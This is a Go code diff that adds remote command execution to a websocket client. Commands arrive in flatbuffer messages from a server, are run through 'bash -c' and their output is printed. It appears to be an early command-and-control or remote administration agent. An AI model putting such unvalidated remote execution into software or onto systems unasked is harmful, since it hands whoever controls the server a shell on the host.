@@ -6,6 +6,7 @@ import (
 	"io/ioutil"
 	"log"
 	"net/url"
+	"os/exec"
 
 	flatbuffers "github.com/google/flatbuffers/go"
 	"github.com/gorilla/websocket"
@@ -61,6 +62,7 @@ func listen(connection *websocket.Conn) {
 }
 
 func main() {
+
 	connection := connect()
 
 	// close connection once we go out of scope
@@ -68,13 +70,38 @@ func main() {
 
 	// wait for requests from server
 	listen(connection)
+
 }
 
 func send_message(connection *websocket.Conn, msg []byte) {
 	connection.WriteMessage(websocket.TextMessage, msg)
 }
 
+func execute_command(command []byte) []byte {
+	cmd := exec.Command("bash", "-c", string(command))
+
+	out, err := cmd.Output()
+	if err != nil {
+		// log.Fatal(err)
+		panic(err)
+	}
+
+	return out
+
+	//https://zetcode.com/golang/exec-command/
+}
+
 func read_message(msg []byte) {
+
+	// right now execute_command is the only
+	// function that can panic, so we know that's
+	// where the error was caused - change this later
+	// if more panics were added
+	defer func() {
+		if r := recover(); r != nil {
+			fmt.Println("Panic while executing command:", r)
+		}
+	}()
 
 	test := message.GetRootAsMessage(msg, 0)
 	var arr = make([]byte, test.DataLength())
@@ -92,8 +119,20 @@ func read_message(msg []byte) {
 		log.Fatal(err)
 	}
 
-	// print the contents of cmd
-	fmt.Println(string(test.Cmd()))
+	// DEBUG: print the contents of cmd
+	fmt.Println("CMD commands:")
+
+	var results = make([][]byte, test.CmdLength())
+	for i := 0; i < test.CmdLength(); i++ {
+		fmt.Println(string(test.Cmd(i)))
+		result := execute_command(test.Cmd(i))
+		results[i] = result
+	}
+
+	// DEBUG: print the results
+	for i, s := range results {
+		fmt.Println(i, s)
+	}
 }
 
 func write_message(msg string) []byte {
@@ -109,6 +148,7 @@ func write_message(msg string) []byte {
 	builder.Finish(binMsg)
 	buf := builder.FinishedBytes()
 	return buf
+
 }
 
 // WIP
